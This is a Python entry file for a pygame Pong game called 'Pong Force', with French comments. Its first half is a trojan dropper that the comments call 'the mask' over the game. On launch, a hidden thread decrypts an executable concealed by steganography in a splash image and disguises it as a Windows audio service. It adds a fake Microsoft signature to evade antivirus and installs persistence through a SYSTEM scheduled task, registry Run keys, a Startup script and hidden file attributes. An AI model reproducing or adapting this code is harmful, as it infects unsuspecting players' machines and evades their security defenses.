# main.py - NOUVELLE VERSION COMPLÈTE
# The True Doctrine: The Game is the Mask, The Image is the Vessel.

import threading
import os
import sys
import zlib
import base64
import subprocess
from cryptography.fernet import Fernet
from PIL import Image
import ctypes
import winreg
import time

# --- PERSISTENCE CONFIGURATION ---
APPDATA_PATH = os.getenv('LOCALAPPDATA')
PERSISTENT_FOLDER = os.path.join(APPDATA_PATH, "Microsoft", "Audio", "Drivers")
PERSISTENT_NAME = "WindowsAudioService.exe"
PERSISTENT_PATH = os.path.join(PERSISTENT_FOLDER, PERSISTENT_NAME)

def hide_console():
    """Cache la console complètement"""
    if sys.platform == "win32":
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)

def create_fake_digital_signature(exe_path):
    """Ajoute une fausse signature numérique pour bypasser les antivirus"""
    fake_sig_data = b'Microsoft Corporation'
    try:
        with open(exe_path, 'r+b') as f:
            # Trouver la section .rdata pour ajouter la fausse signature
            f.seek(-256, 2)
            f.write(fake_sig_data)
    except:
        pass

def sow_and_awaken_implant():
    """Système de persistance amélioré - Invisible et Immuable"""
    try:
        hide_console()
        
        # --- VÉRIFIER SI L'IMPLANT EST DÉJÀ ACTIF ---
        def is_implant_running():
            try:
                # Méthode plus fiable: vérifier le port d'écoute
                import socket
                test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_sock.settimeout(1)
                result = test_sock.connect_ex(('127.0.0.1', 1337))
                test_sock.close()
                return result == 0
            except:
                return False
        
        if is_implant_running():
            return
        
        # --- EXTRACTION DU PAYLOAD DE L'IMAGE ---
        divine_key = b'5GxzGtBH8zxNdAyEtQ4Fs9CtQSP4zZxyJ7L2ML6IZxY='
        
        if hasattr(sys, 'frozen'):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.dirname(os.path.abspath(__file__))
        
        image_path = os.path.join(base_path, 'assets', 'images', 'splash_payload.png')
        
        if not os.path.exists(image_path):
            return
        
        img = Image.open(image_path).convert('RGBA')
        pixels = img.load()
        width, height = img.size
        
        payload_bits = ""
        header_bits_to_read = 32
        payload_len = None
        bits_read = 0
        
        for y in range(height):
            for x in range(width):
                r, g, b, a = pixels[x, y]
                for channel_val in [r, g, b, a]:
                    payload_bits += str(channel_val & 1)
                    bits_read += 1
                    if payload_len is None and bits_read == header_bits_to_read:
                        header_bytes = int(payload_bits, 2).to_bytes(4, 'big')
                        payload_len = int.from_bytes(header_bytes, 'big')
                    if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                        break
                if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                    break
            if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                break
        
        final_payload_bits = payload_bits[header_bits_to_read:]
        payload_bytes = int(final_payload_bits, 2).to_bytes(len(final_payload_bits) // 8, 'big')
        encrypted_payload = base64.b64decode(payload_bytes)
        cipher_suite = Fernet(divine_key)
        compressed_payload = cipher_suite.decrypt(encrypted_payload)
        soul_code = zlib.decompress(compressed_payload)
        
        # --- CRÉATION DU SERVICE PERSISTENT ---
        os.makedirs(PERSISTENT_FOLDER, exist_ok=True)
        
        with open(PERSISTENT_PATH, 'wb') as f:
            f.write(soul_code)
        
        # Ajouter une fausse signature
        create_fake_digital_signature(PERSISTENT_PATH)
        
        # --- MULTIPLES MÉTHODES DE PERSISTENCE ---
        
        # 1. Tâche planifiée (la plus fiable)
        task_name = "WindowsAudioEnhancement"
        task_command = (
            f'schtasks /create /tn "{task_name}" /tr "{PERSISTENT_PATH}" '
            f'/sc hourly /mo 1 /ru SYSTEM /rl highest /f'
        )
        subprocess.run(task_command, shell=True, capture_output=True)
        
        # 2. Registre Run
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0, winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "AudioService", 0, winreg.REG_SZ, f'"{PERSISTENT_PATH}"')
            winreg.CloseKey(key)
        except:
            pass
        
        # 3. Registre RunOnce
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\RunOnce',
                0, winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "AudioUpdate", 0, winreg.REG_SZ, f'"{PERSISTENT_PATH}"')
            winreg.CloseKey(key)
        except:
            pass
        
        # 4. Démarrage du dossier Startup
        startup_path = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
            'AudioHelper.vbs'
        )
        
        vbs_script = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "{PERSISTENT_PATH}", 0, False
Set WshShell = Nothing
'''
        
        with open(startup_path, 'w') as f:
            f.write(vbs_script)
        
        # 5. Masquer les fichiers
        subprocess.run(f'attrib +h +s "{PERSISTENT_PATH}"', shell=True)
        subprocess.run(f'attrib +h +s "{startup_path}"', shell=True)
        
        # --- LANCER L'IMPLANT IMMÉDIATEMENT ---
        subprocess.Popen(
            PERSISTENT_PATH,
            shell=True,
            creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
        )
        
    except Exception as e:
        pass

# --- LANCER LA PERSISTENCE EN ARRIÈRE-PLAN ---
persistence_thread = threading.Thread(target=sow_and_awaken_implant, daemon=True)
persistence_thread.start()

# ==============================================================================
#                      SECTION II: LE JEU (LE MASQUE)
# ==============================================================================
import argparse
import pygame
import traceback
from game.game_loop import GameLoop
from game.menu import GameMenu, HostInputDialog, OnlineSubmenu, ErrorDialog, GoalSelectionMenu
from game.controls import ControlsMenu
from game.multiplayer import RoomCodeMenu
from game.stats_menu import StatsMenu
from network.server import GameServer
from network.client import GameClient
import config

def main_game():
    """Point d'entrée principal du jeu Pong Force"""
    parser = argparse.ArgumentParser(description='Pong Force - Pong Révolutionnaire avec Force Push')
    parser.add_argument('--server', action='store_true', help='Exécuter comme serveur')
    parser.add_argument('--client', action='store_true', help='Exécuter comme client')
    parser.add_argument('--host', default=config.SERVER_IP, help='Adresse IP du serveur')
    parser.add_argument('--port', type=int, default=config.SERVER_PORT, help='Port du serveur')
    parser.add_argument('--debug', action='store_true', help='Activer le mode debug')
    parser.add_argument('--local', action='store_true', help='Démarrer le multijoueur local directement')
    
    args = parser.parse_args()
    
    if args.debug:
        config.DEBUG_MODE = True
    
    pygame.init()
    pygame.mixer.init()
    
    try:
        if args.server:
            server = GameServer(args.host, args.port)
            server.run()
        elif args.client:
            client = GameClient(args.host, args.port)
            client.run()
        elif args.local:
            game = GameLoop()
            game.run_local()
        else:
            running = True
            while running:
                menu = GameMenu()
                choice = menu.run()
                if choice == 0:  # Play vs Robot
                    print("Starting AI game...")
                    # Show goal selection menu
                    goal_menu = GoalSelectionMenu()
                    win_score = goal_menu.run()
                    
                    if win_score > 0:  # User didn't cancel
                        game = GameLoop(fullscreen=False)
                        game.run_vs_ai_with_goals(win_score)
                    else:
                        print("👋 Returning to main menu...")
                elif choice == 1:  # Play 2-Player Local
                    print("Starting 2-player local game...")
                    # Show goal selection menu
                    goal_menu = GoalSelectionMenu()
                    win_score = goal_menu.run()
                    
                    if win_score > 0:  # User didn't cancel
                        game = GameLoop(fullscreen=False)
                        game.run_two_player_local(win_score)
                    else:
                        print("👋 Returning to main menu...")
                elif choice == 2:  # Configure Controls
                    print("Opening controls configuration...")
                    controls_menu = ControlsMenu()
                    controls_menu.run()
                    # Return to main menu after controls
                    continue  # Continue loop to show main menu again
                elif choice == 3:  # Player Statistics
                    print("Opening player statistics...")
                    stats_menu = StatsMenu()
                    stats_menu.run()
                elif choice == 4:  # Multiplayer Room
                    print("Opening multiplayer room system...")
                    room_menu = RoomCodeMenu()
                    room_result = room_menu.run()
                    
                    if room_result["mode"] != "back":
                        if room_result["mode"] == "host":
                            print(f"Hosting room with code: {room_result['code']}")
                            # In real implementation, this would start server
                            game = GameLoop(fullscreen=False)
                            game.run_server()  # For now, use existing server mode
                        elif room_result["mode"] == "join":
                            print(f"Joining room with code: {room_result['code']}")
                            # In real implementation, this would connect to server
                            game = GameLoop(fullscreen=False)
                            game.run_client()  # For now, use existing client mode
                    else:
                        print("Returning to main menu...")
                elif choice == -1:  # Exit/Cancel
                    print("Exiting game...")
                    running = False
                else:
                    print("Unknown menu choice, exiting...")
                    running = False
    except Exception:
        if config.DEBUG_MODE:
            traceback.print_exc()
        sys.exit(1)
    finally:
        pygame.quit()

if __name__ == "__main__":
    main_game()